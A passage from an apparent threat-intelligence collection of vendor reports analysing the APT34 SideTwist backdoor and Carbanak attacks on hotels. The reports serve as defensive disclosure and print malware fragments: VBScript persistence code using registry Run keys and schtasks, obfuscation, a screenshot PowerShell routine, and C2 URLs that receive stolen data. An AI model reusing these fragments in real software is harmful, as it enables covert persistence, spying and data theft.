ﬁngerprinting of the target device and sending of the information to the C2 server. Dropping embedded executable to disk with a “doc” extension (later to be renamed to “.exe”). Registering a Windows schedule task that would launch the executable every X minutes. Fig 3: VBA functions call graph generated by Vba2Graph https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ Pagina 2 di 8 Iran’s APT34 Returns with an Updated Arsenal - Check Point Research 08/08/24, 11:28 In the macros function call graph above, we can see that from the Document_Open and the Document_Close functions, there are multiple calls to the DnsQuery external function. APT34 is notorious for its heavy use of DNS tunneling through many of their different tools, and this time this feature also made its way into the initial macros stage. Once the macros are executed, DNS requests are used to beacon back to the attacker, and inform them of the current stage of the execution, as well as to deliver some victim identiﬁable information. Fig 4: Snippet from the malicious macros, responsible for sending DNS queries In this step, the attacker is using the publicly available requestbin.net DNS tunneling service, in order to get updates about the macros infection progress. This way the attacker-owned infrastructure would not be exposed, in case a sandbox would not be able to fully “detonate” the document. Below is a demonstration of the information the attacker would see on the requesbin.net website, when a victim executes the malicious macros from a system with the following environment: User name: John Hostname: John-pc Fig 5: The macro requests as viewed on “requesbin.net”, with source IP address and timestamp redacted The encoded data is derived from the PC information, in the following manner: Fig 6: encoded DNS data https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ Pagina 3 di 8 Iran’s APT34 Returns with an Updated Arsenal - Check Point Research 08/08/24, 11:28 Second Stage Payload: SideTwist The backdoor in this stage, is a variant we haven’t seen before in previous APT34 operations, but provides functionality which is simple and similar to other C based backdoors utilized by the group: DNSpionage and TONEDEAF and TONEDEAF2.0. The functionality of the backdoor includes download, upload and shell command execution. Persistence In this infection chain the persistence is actually established by the 1st stage macros, and the 2nd stage payload does not have any persistence mechanism of its own. Persistence is achieved in the 1st stage, when the schedule task is registered. The scheduled task named SystemFailureReporter will execute the 2nd stage payload every 5 minutes: Fig 7: Scheduled task on an infected machine The backdoor is very dependent on this persistence mechanism, as every time it would launch, it would only execute a single command provided from the C&C server and immediately shut down, until it is launched again by the scheduled task. Initialization The backdoor starts by collecting basic information about the victim’s machine and calculating a 4-byte long victim identiﬁer, based on the user-name, computer-name and the domain name of the target environment. This identiﬁer will be used in the follow-up C&C communication. Fig 8: Code to gather identiﬁable information Next the malware will verify that the update.xml ﬁle that was supposed to be created in the 1st stage of the infection does indeed exists, and if not, it will terminate itself – printing the following text to the debugging output using the OutputDebugString function: “Please install visual studio 2017 and try again” Fig 9: Code to verify that the 1st stage was executed As the purpose of this function is to print debugging information, only during the debugging process of an application, the text will not be visible to the regular user. C&C communication The backdoor’s communication with the C&C server ( sarmsoftware[.]com ) is HTTP based on port 443 with port 80 as fallback. https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ Pagina 4 di 8 Iran’s APT34 Returns with an Updated Arsenal - Check Point Research 08/08/24, 11:28 The backdoor uses two different techniques for its outgoing and incoming communications with the C&C server, though in both cases the same encryption algorithm is utilized (see more on encryption below). Command Request Communication The backdoor contacts the C&C server in the following URL using a GET request: sarmsoftware[.]com/search/{identifier} The response to this request is hidden in the source code of following Flickr lookalike page: Fig 10: Fake Flickr lookalike page used as C&C The response is returned to the backdoor within the HTML code, in the following format: /*Encrypted_Message_Encoded_with_Base64*/ Fig 11: C&C commands embedded within the code After this base64 string is decoded and decrypted, the plain-text content is in the following pipe-separated format: Fig 12: Encrypted data format Command Number – a running index number to keep track of executed commands. If set to any number other than -1 , the backdoor should proceed to execute the command, according to the Command ID. Otherwise, ignore and terminate. Command ID – can be one of the following commands: 101 – Shell Command: execute the Shell command attached in the {Arg1} argument. 102 – Download File: Downloads a ﬁle that can be found on the {Arg2} path on the server, and saves it on the disk with the {Arg1} name. 103 – Upload File: Uploads a local ﬁle {Arg1} to the server. 104 – Shell Command (duplicate): execute the Shell command attached in the {Arg1} argument. Command Results Communication After the backdoor has executed an arbitrary command on the victim’s machine, it returns the result of the executed command to the C&C server, to the same URL as before, but in a POST request instead of a GET: sarmsoftware[.]com/search/{identifier} https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ Pagina 5 di 8 Iran’s APT34 Returns with an Updated Arsenal - Check Point Research 08/08/24, 11:28 The format of the POST body is a simple JSON, based on the command number provided from the C&C server and the encrypted result of the command execution: Fig 13: Result data format Communication Encryption As the basis for the encrypted communication, the attackers utilize the Mersenne Twister pseudorandom number generator. The 4 ﬁrst bytes of each encrypted message is the seed for the Mersenne Twister, to be used for the decryption of the rest of the message. The encrypted Base64 communication can be decrypted using the following Python snippet: 1. 2. 3. 4. 5. 6. 7. 8. def decode(msg): bs=base64.b64decode(msg) seed=int.from_bytes(bs[:4],byteorder='big') rng = mersenne_rng(seed) k=rng.get_random_number() key=int.to_bytes(k,length=4,byteorder='little') dec="""".join([chr(bs[i]^key[(i-4)%4]) for i in range(4,len(bs))]) return dec Attribution Both the malicious macros, the backdoor, the targeting, and the techniques used in this operation – all align with previously reported campaigns attributed to APT34. Document Similarity Besides the fact that like in previous APT34 operations, once again we see job opportunity documents being used to encourage the victim to enable macros, there are technical similarities as well. The same variable name beacher was present in and old DNSpionage campaign: Fig 14: Similar variable name in old macros code The main functionality of the macros remained the same as in a previous APT34 campaign: The malicious macros use the MouseAvailable function for evasion, and create a scheduled task to execute a payload embedded within the document. C&C Communication Similarity APT34’s backdoors DNSpionage and TONEDEAF are known to receive commands from the servers by searching for speciﬁc pattern hidden inside the HTML content of a legitimate looking website. In our case the attackers utilized a Flickr lookalike page, while in previous campaigns GitHub, Wikipedia, and Microsoft lookalikes were used. Additional APT34 Sightings While analyzing the above campaign, this and additional APT34 related documents were uploaded to VirusTotal and noted by malware https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ Pagina 6 di 8 Iran’s APT34 Returns with an Updated Arsenal - Check Point Research 08/08/24, 11:28 researchers on Twitter. These documents utilized the very same requestbin.net DNS tunneling service in the initial macros and delivered another of the group’s signature tools: a variant of the .NET based backdoor named Karkoff, which utilized internet facing exchange servers as a communication method with the attackers. The newly found artifacts emphasize the extent of the ongoing APT34’s offensive operations against targets in the Middle East, and especially in Lebanon: The Karkoff implant (MD5: ab25014c3d6f77ec5880c8f9728be968) included credentials for an exchange server belonging to the Lebanese Government ( mail.army.gov[.]lb ), which might be an indication of a long running compromise of their network. Conclusion Iran backed APT34 shows no sign of slowing down, further pushing its political agenda in the middle-east, with an ongoing focus on Lebanon – using offensive cyber operations. While maintaining its modus operandi and reusing old techniques, as reviewed above, the group continues to create new and updated tools to minimize the possible detection of their tools by security vendors. In this publication we analyzed the newest backdoor variant deployed by the group’s ongoing job opportunities campaigns, which includes malicious documents with job offers – a technique they have successfully employed since at least 2018. Check Point Sandblast protects against this APT attack, and prevents it from the very ﬁrst steps. Appendix A: Indicators of Compromise Malicious document: MD5: 6615c410b8d7411ed14946635947325e SHA1: 9bba72ac66af84253b55dd7789afc90e0344bf25 SHA256: 13c27e5049a7fc5a36416f2c1ae49c12438d45ce50a82a96d3f792bfdacf3dcd SideTwist backdoor: MD5: 94004648630739c154f78a0bae0bec0a SHA1: 273488416b5d6f1297501825fa07a5a9325e9b56 SHA256: 47d3e6c389cfdbc9cf7eb61f3051c9f4e50e30cf2d97499144e023ae87d68d5a C&C server: sarmsoftware[.]com GO UP BACK TO ALL POSTS BLOGS AND PUBLICATIONS SEARCH https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ Pagina 7 di 8 CONTACT USDISCLOSURE POLICYCHECKPOINT.COMUNDER ATTACK?Latest PublicationsCPR Podcast ChannelWeb 3.0 SecurityIntelligence ReportsResourcesAbout UsSUBSCRIBE"
carbanak,cti-hal,29839d5fa792,G0008,"New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 Trustwave Unveils New Offerings to Maximize Value of Microsoft Security Investments. Learn More Contact Us Login Incident Response Services Solutions SPIDERLABS BLOG Request a Demo Why Trustwave Partners New Carbanak / Anunak Attack Methodology Resources November 15, 2016 | 10 minutes read | SpiderLabs Researcher In the last month Trustwave was engaged by multiple hospitality businesses for investigations by an unknown attacker or attackers. The modus operandi for all three investigations were very similar and appear to be a new Carbanak gang attack methodology, focused on the hospitality industry. Carbanak is a prolific crime group, well known for stealing over one billion dollars from banks in 2015 (*Kaspersky estimated loss) and more recently orchestrating an attack on the Oracle Micros POS support site that put over one million Point of Sale systems at risk. The current investigations are still underway but the known indicators of compromise in these https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 1 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 new attacks will be presented below. At the time of investigation this malware was not correctly detected by any existing antivirus engines, and domains / IP's were not found in any commercial threat intelligence feeds. It is also interesting to note that just during the time that it took to write this blog, Carbanak returned to their victims with significantly upgraded malware. This demonstrates the speed and versatility of this threat group. We have included analysis for two separate versions of AdobeUpdateManagementTool.vbs in this report. (The malware used following the initial infection) Version two arrived only two weeks after we began investigating this new campaign. Attack Vector The attacks began via social engineering. An attacker called the customer contact line saying that they were unable to use the online reservation system and requested to send their information to the agent via email. The attacker stayed on the line until the agent opened the attachment contained in the email and hung up when his attack was confirmed successful. The email attachment was a malicious Word Document that contained an encoded .VBS script capable of stealing system information, desktop screenshots, and to download additional malware. A screenshot of the malicious Word document is shown below. The malicious VB Script will use macros to search for instances of Microsoft Word running on the system, if https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 2 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 found, it will clear the existing text and replace it with the following text. The victim system will then reach out to http://95.215.47.105 to retrieve additional malware called AdobeUpdateManagementTool.vbs. AdobeUpdateManagementTool.vbs - Indicators of compromise: File name: adobeupdatemanagementtool.vbs SHA-1 8d7c90a699b4055e9c7db4571588c765c1cf2358 (Version 1) SHA-1 a91416185d2565ce991fc2c0dd9591c71fd1f627 (Version 2) Creates folder: %temp%\WindowsUpdate Creates folder: %temp%\WindowsUpdate_\Dropebox<username> Adds file to WindowsUpdate folder: vbs Adds persistence mechanism to the CURRENT_USER registry hive in the CurrentVersion\Run and CurrentVersion\RunOnce keys to autostart AdobeUpdateManagementTool. A scheduled task is created named SysChecks which calls the vbs https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 3 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 A service is created named 'ADOBEUPDTOOL' which calls the AdobeUpdateManagementTool.vbs The malware drops a Shockwave Flash icon and disguises itself as such. The malware contacts the following and may attempt to download doc: http://revital- travel.com/cssSiteteTemplates http://juste- travel.com/cssSiteteTemplates http://park-travels.com All domains resolve to the same IP address (192.99.14.211) http://95.215.46.249 179.43.133.34 The malware may report to the following command and Control Servers, depending on the version used in the attack: http://148.251.18.75 http://95.215.46.221 http://95.215.46.229 http://95.215.46.234 http://81.17.28.124 This malware was capable of stealing significant system and network information. It was also used to download several other reconnaissance tools to map out the network. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 4 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 Downloaded tools have included Nmap, FreeRDP, NCat, NPing, and others. Two files of significance, el32.exe and el64.exe, are privilege escalation exploits for 32 and 64 bit architectures. Their hashes are as follows: el32.exe SHA1: 83D0964F06E5F53D882F759E4933A6511730E07B el64.exe SHA1: CF5B30E6ADA0D6EE7449D6BDE9986A35DF6F2986 This malware was primarily responsible for the reconnaissance stage of the attack. However, it also downloaded additional malware that enables the next stage of the attack and could execute powershell scripts on command. Beaconing - AdobeUpdateManagementTool.vbs We have seen slightly different data beaconing methodologies over the different attacks, but the general approach has remained the same. Beaconing messages are sent out to 179.43.133.34 via standard HTTP GET requests every 5 minutes. Using this simple methodology allows the beaconing to hide very well within standard corporate network traffic. The content of the GET request is encoded with Base64 and secondarily encrypted with RC4. Trustwave has written a specialized decoder for this traffic and it can be obtained upon request. The innocuous nature of this traffic allows it to be stealthy in a corporate network, however, its uniformity of structure also allows analysts to identify it relatively quickly as well. Security https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 5 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 staff can identify beaconing traffic using the following technique. The network packet times of the GET requests originating from a compromised host occur almost exactly every 300 seconds (5 minutes). No web content is ever returned from the GET request except for code 200 OK, as shown below. (**Please note that the name=value pairs have been snipped for confidentiality reasons): GET /{random_param_name}.jsp? qqksq=MTgzLTIyIDhBIDkwI … IDNFIDYwIDZCIDU4IEJFIDZCIENFIDY3&kfb4mz=MTgzLTIyIDhBIDkwIEV … IDBGIDUyIDZDIDhF&xzn8=MTgzLTIyIDhBIDkwIEVGID … DUyIDZDIDhF HTTP/1.1 Connection: Keep-Alive Keep-Alive: 300 Content-Type: application/x-www-form- urlencoded Accept: */* User-Agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 Charset: utf-8 Host: 179.43.133.34 HTTP/1.1 200 OK Date: Tue, 08 Nov 2016 20:12:05 GMT Server: Apache/2.2.22 (Debian) X-Powered-By: PHP/5.4.45-0+deb7u2 Vary: Accept-Encoding Content-Length: 0 Keep-Alive: timeout=5, max=100 https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 6 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 Connection: Keep-Alive Content-Type: text/html The purpose of the GET request, with nothing coming back except the 200 code, is to ""phone home"" so the attacker knows the compromised system is available for further exploitation. To locate these specific GET requests you can use the following regular expression as an initial filter: grep -E ""GET /[a-z]{1,4}[a-z0-9]{1,6}\.jsp\?"" log.txt Full analysis of this malware can be found later in this report. Second Stage – Carbanak / Anunak Malware: Filename: bf.exe SHA1: 3d00602c98776e2ea5d64a78fc622c4ff08708e3 This malware executes a new iteration of svchost.exe and injects its malicious code into this running process. This hides the malware within the svchost.exe process. (*Warning- our analysis has shown that some antivirus firms incorrectly identify this file as ransomware.) It then drops a pseudo-randomly named configuration file into the %ProgramData%\Mozilla folder. This file's name is base64 encoded and based on the infected system's MAC code, so identifying it by name will be challenging. However, it does always have a .bin extension. Any recent file in this folder with a .bin extension may be https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 7 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 suspect. It then searches Kaspersky antivirus processes and terminates them if running on the victim system. For persistency, it registers itself as a service with the following details: Service name: RpcSsSys (this name is random, may vary on different system) Path: ""C:\Documents and Settings\All Users\Application Data\Mozilla\svchost.exe"" Display name: Emote Procedure Call (RPC) It then proceeds to download kldconfig.exe, kldconfig.plug, and runmem.wi.exe. These tools are all well-known Carbanak malware and variations of them were used in the banking intrusions that made them famous in 2015. Additionally, the decrypted string references ""anunak_config"" which is the encrypted configuration file that it downloads from its control server. The Anunak crime group is generally believed to be synonymous with Carbanak. This malware is very multi-functional as it can enable remote desktop, steal local passwords, search user's email, target IFOBS banking https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 8 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 systems (which Carbanak used so effectively in recent banking attacks), or install completely different remote desktop programs, such as VNC or AMMYY. Full details on this malware's functionality is included later in this report. Finally, this malware, like so many others, is designed to target credit card data by scraping memory on Point-of-Sale systems. This leaves little doubt as to its end goal on victim systems. The attacker uses social engineering to gain their foothold in the victim network, downloads reconnaissance tools to scan the network and move laterally into the card holder data environment, and then infects systems able to process card transactions. Exfiltration – bf.exe This malware provides the attacker remote command and control of the victim system via a multifunctional backdoor capability. It communicates via an encrypted tunnel on port 443 with the following IP addresses: 5.45.179.173 92.215.45.94 These are also the destinations that stolen data will be exfiltrated to. This malware may steal credit card data, as well as screen captures, keylogger information, email addresses from the PST file, enable RDP or VNC sessions, or to obtain additional system information. All exfiltrated information is encrypted with base64+RC2 and sent via HTTP POST messages. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 9 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 If you identify any of these IoC's on your network, you should contact a Trustwave account representative immediately, or reach out directly to the Trustwave SpiderLabs IR team at our 24-hour hotline: 24hr Hotline +1 (866) 659-9097 Option 5 International: +1 (312) 873-7500, Option 4 Detailed Analysis of Carbanak Malware: Malicious Word Document Attachment / Adobeupdatetool.Vbs (Version 1) Summary The file is OLE compound file format that contains an embedded .VBE (encoded VBS) script. The dropped script is capable of stealing system information, desktop screenshots and to download / execute additional malware. Analysis The encoded VBScript is embedded in OLE compound file. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 10 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 When the malicious document file is opened, the embedded VBScript (VBE) file is dropped in the Windows %temp% folder. The Loader VBScript The dropped VBE file is a loader script that drops, installs and executes a second layer VBScript payload in the victim's system. It creates a folder named ""WindowsUpdate_"" in the Window's %temp% directory, If the folder already exists, it will create the folder in the parent directory where the script resides. SSCripTdir=sh.ExpanDEnvirOnmentStrings(""%TMP%"")+""\WindowsUpdate_"" IF not fso.FoldErEXIstS(sScriptdiR)Then fso.CReatefOlder SScriptDir End IF Err.Clear If NoT fso.FolderExiSTs(SSCriptDir)THen sScriptDir=fso.GetParentFolderName(Wscript.ScriptFulLName)+""\WindowsUpdate_"" If NoT fso.FOlderExiSts(SScriptDir)THen fso.CReAteFolder sscriptDir https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 11 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 A registry key is created that points to the Loader's directory sh.RegWriTe""HKEY_CURRENT_USER\System\CurrentControlSet\Control\Network\LdrPath"",sScriPtdIr,""REG_SZ"" The second VBScript payload is embedded in the loader script as a Base64 string: The loader script decodes the base64 string. This is then saved to a file named ""AdobeUpdateManagementTool.vbs"" into the ""\WindowsUpdate_"" folder. Dim run_Pth_scR run_pth_scr=ldrpath+""\AdobeUpdateManagementTool.vbs"" dim RUn_Pth A persistence registry key is also created by the loader script: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\AdobeUpdateManagementTool On ErrOr Resume NExt sh.RegWrIte""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\AdobeUpdateManagementTool"",run_pth,""REG_SZ"" ErR_NUmBer=err.number If Err_nuMber<>0 Then cerr1.ErrAdd""Error #I-9"",0 Err.ClEar End If On Error Resume next sh.RegWrite""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\AdobeUpdateManagementTool"",ruN_ptH,""REG_SZ"" Err_Number=eRr.number The loader script adds a scheduled task with a task named ""SysChecks"". The purpose of this scheduled task is to run the payload script (AdobeUpdateManagementTool.vbs) in every 5 minutes sh.Run""schtasks /create /tn """"SysChecks"""" /tr https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 12 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 """"""&run_pth&"""""" /sc minute /mo 5"",0,falSe A SWF icon file is also dropped in the folder in order to disguise the dropped file as a Shockwave Flash file: A shortcut file is also added in the Windows startup folder as ""AdobeUpdateManagementTool.lnk"" Set LinKSTart=sh.CreateShoRTcuT(SPath&""\AdobeUpdateManagementTool.lnk"") With LinksTart LinksTart.ArGuMeNts=ruN_pth_scr .dEsCription=""AdobeUpdateManagementTool"" .HoTKeY=""CTRL+X"" .IconLocation=ico_Filename .TargEtPath=wscRipt_pThPaTH .WiNdoWStyle=7 .WorkinGdirectory=sh.ExpandEnvironmEntStrings(""%windir%\System32"") .SaVe The Payload Script The payload script is dropped in the ""%temp%\WindowsUpdate_"" as ""AdobeUpdateManagementTool.vbs"". The script uses obfuscation, a combination of base64 and integer-ed characters (chr) to hide malicious code. #Example of obfuscation: (F9lornwzv1(""cnVuZGxsMzIga2U="") & """" & chr(29 + 85) & chr(81 + 29) & chr(-42 + 143) & https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 13 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 chr(-76 + 184) & chr(-20 + 71) & chr(-51 + 101) & chr(67 + -23) & chr(70 + 13) & chr(-57 + 165) & chr(50 + 51) & chr(-67 + 168) & chr(53 + 59) & """") The payload script checks if the following folder exists otherwise it creates it: %AllUsersProfile% + ""\Dropebox"" + <username> (for example in Windows 7 system: C:\ProgramData\DropeboxJoePC). This is where it stores additional script files and stolen data: dim EZ0uaqbfk9m: EZ0uaqbfk9m = EY4hrd8cuo.ExpandEnvironmentStrings(""%USERNAME%"") EZ0uaqbfk9m = DT6zmqx4fb( EZ0uaqbfk9m ) FA1pcr7i8c3z = ldrpath +"" \Dropebox"" + EZ0uaqbfk9m The payload has the following functionality: Steal system information System Name System Manufacturer System Model Time Zone Total Physical Memory Processor System Type Processor BIOS Version Networking information Computer name Domain User name Desktop screenshot https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 14 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 A powershell script (filename: screenshot__.ps1) is created to screenshot victim's desktop. #Desktop screenshot routine, dropped as a powershell $ErrorActionPreference=""stop""; try{ [Reflection.Assembly]::LoadWithPartialName(""System.Drawing"") function screenshot([Drawing.Rectangle]$bounds, $path){ $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height $graphics = [Drawing.Graphics]::FromImage($bmp) $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size) $bmp.Save($path) $graphics.Dispose() $bmp.Dispose() } $ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path $pth = $ScriptDir + ""\screenshot__.png"" $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1500, 1000) screenshot $bounds $pth; }catch{} Downloaded malicious executable It may also be able to receive additional malware executables and install them on the victim's computer. Terminate Processes The payload is also capable of terminating processes. Network The malware sends stolen data to the following URI: urlArry(0) = ""http://95.215.46.249"" urlArry(1) = ""http://revital-travel.com/cssSiteteTemplates"" https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 15 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 urlArry(2) = ""http://juste- travel.com/cssSiteteTemplates"" The data is sent as a data encrypted with RC4 and Base64 It is sent via an HTTP POST tunnel to the attacker's server. POST /{random_param_name}.jsp? xz2q=MjgtQUIgMTEgRDYgMEYgMTggNTYgNEUgRDQgODYgQTEgNUQgOTAgRDEgQjAgM0UgNEIgRkEgMDIgRTQgOEUgOUIgNUUgNEEgMTYgMTcgMDIgQzYgRDQgMzcgMUEgNTUgOTggQUIgQjYgMEIgNkUgMTggOUMgMTQgMjcgMEQgNUQgRDUgNUUgMkMgM0IgN0YgQUYgNUUgNzYgMzYgRUUgN0QgODIgRDMgMzYgN0EgNzIgNDYgNjEgNTEgQTcgQ0EgMzI=&hwhv50m=MjgtQUIgMTEgRDYgMEYgMDQgNDkgNzQgQkMgQUUgRkMgNUEgOTcgRDEgQjAgM0UgNEIgRkEgMDIgRTQgOEUgOUIgNUUgNEEgMTYgMTcgMDIgQzYgRDQgMzcgMUEgNTUgOTggQUIgQjYgMEIgNkUgMTggOUMgMTQgMjcgMEQgNUQgRDUgNUUgMkMgM0IgN0YgQUYgNUUgNzYgMzYgRUUgN0QgODIgRDMgMzYgN0EgNzIgNDYgNjEgNTEgQTcgQ0EgMzI=&cfcch9s=MjgtQUIgMTEgRDYgMEYgMUYgNTQgMTcgQkQgODIgODQgNTUgQzkgRDEgQjAgM0UgNEIgRkEgMDIgRTQgOEUgOUIgNUUgNEEgMTYgMTcgMDIgQzYgRDQgMzcgMUEgNTUgOTggQUIgQjYgMEIgNkUgMTggOUMgMTQgMjcgMEQgNUQgRDUgNUUgMkMgM0IgN0YgQUYgNUUgNzYgMzYgRUUgN0QgODIgRDMgMzYgN0EgNzIgNDYgNjEgNTEgQTcgQ0EgMzI= HTTP/1.1 Connection: Keep-Alive Keep-Alive: 300 Content-Type: multipart/form-data; boundary=""eb3d0b5d91fbde4d7a58ef5b9c954051"" Accept: */* Accept-Language: en-us User- Agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh- tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 Charset: utf-8 Content-Length: 7274 Host: 95.215.46.249 Detailed Analysis of Carbanak Malware: Malicious Word Document Attachment / Adobeupdatetool.Vbs (Version 2) Summary This file is written in VBScript. It can receive commands from the attacker to download and execute EXE files, VBScript, or Powershell script files. Exfiltrated data is sent to the attacker's IP addresses through an HTTP POST tunnel Analysis Upon execution AdobeUpdateManagementTool.vbs will query the process in the infected system if it is https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 16 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 already running, if an existing instance of the script is already running, it will quit, otherwise it will proceed. It then attempts to read the following registry key: HKEY_CURRENT_USER\System\CurrentControlSet\Control\Network\CC - Computer Count The script then generates a unique identifier, using the following format: %md_id% - %l_ver% - %ptrtr% - %compCount%where: %md_id% - XORed Computer name and MAC Address. %l_ver% - hard coded in the malware script e.g. Dim HH5hjs54j69a: HH5hjs54j69a = ""1"" %ptrtr% - hard coded in the malware script e.g Dim HI0cvexizqw: HI0cvexizqw = ""2"" %compCount% - value from the registry key: HKEY_CURRENT_USER\System\CurrentControlSet\Control\Network\CC, default value is the string ""NO"" The malicious script checks if the following folder exists otherwise it creates it: %AllUsersProfile% + ""\Dropebox"" + <username> for example in Windows 7 system C:\ProgramData\DropeboxJoePC The following files will be dropped under this Folder, these files are only created if required by the command sent by the attacker: !"" screenshot__.ps1 - a powershell script that takes screenshots of the active desktop https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 17 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 $"" screenshot__.png - the screenshot image %"" exe__.exe - an executable file sent by the attacker &"" vb__.vbs - a VBscript sent by the attacker '"" ps1__.ps1 - a Powershell script sent by the attacker ("" insatller.vbs - updater script sent by the attacker Every time this script is executed, it requests commands from the Attacker's control server using HTTP GET request. GET /{random_param_name}.jsp?pId=== {unique ID %md_id%}<<$>>{MD5 hash of the current Date & Time} à this is encrypted in RC4 with hardcoded key and Base64. The GET parameters may also be iterated up to 3 times. User-agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 Charset:utf-8 Connection: Keep-Alive Keep-Alive:300 Content-Type: application/x-www-form- urlencoded The script receives three types of information from the GET request: id = the unique ID of the infected system (%md_id%) cmd = MD5 hash of the attacker's command cmduniq = contains a value that signifies that this command is unique The commands sent by the attackers are in MD5 hash, this is a anti-analysis technique. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 18 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 Here are the command hashes that the attacker may send: COMMAND HASH (MD5) DESCRIPTION info proc scrin exe caf9b6b99962bf5c2264824231d7a40c Retrieves system information. See below for the detailed information and exfiltration method. Retrieves all running 6844acdce7e192c21c184914d73ab6be process. e3b523c3cf36e1e0f64fec6ac6ac3ff7 Takes screenshot of desktop. This command drops and executes the file screenshot__ps1 and the image is saved to screenshot__.png. The image is then sent to the control server IP address via an HTTP POST tunnel The attacker sends this command with an accompanying executable file that is saved to a file called exe__.exe. This is then 98e83379d45538379c2ac4e47c3be81d https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 19 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 executed and after 10 seconds this file will be deleted. The attacker sends this command with an accompanying VBScript that is saved as vb__.vbs. The script is executed and the result returned by the script is saved to a temporary file in the Windows %temp% folder. The results are sent to the control server through an HTTP POST tunnel (see exfiltration detail below). Both resulting files are deleted after the execution. b3720bcc7c681c1356f77ba9761fc022 Note: the results are encoded in Base64 with the following text format: type: vbs time: {currrent time} vbs https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 20 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 result: {result details} update ps1 3ac340832f29c11538fbe2d6f75e8bcc This command receives an accompanying VBScript updater. This script is saved to insatller.vbs and then executed, it then uninstalls its old version. The file is deleted 10 seconds after execution. the attacker sends this command with an accompanying Powershell script that is saved to ps1__.ps. The script is executed and the result is returned by the script and is saved to a temporary file in the Windows %temp% folder. The result is sent to the control server through HTTP POST tunnel (see exfiltration detail below). 9ffb800e76372160cbb02415dccd7dec https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 21 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 Both files are deleted after the execution. Note: the results are encoded in Base64 with the following text format: type: ps1 time: {currrent time} result: {result details} dll delete scrrunr This command did not function in this 06416233fe5ec4c5933122e4ab248af1 version of the malware. Removes the service running this script by running this command ""cmd.exe /c """"sc delete 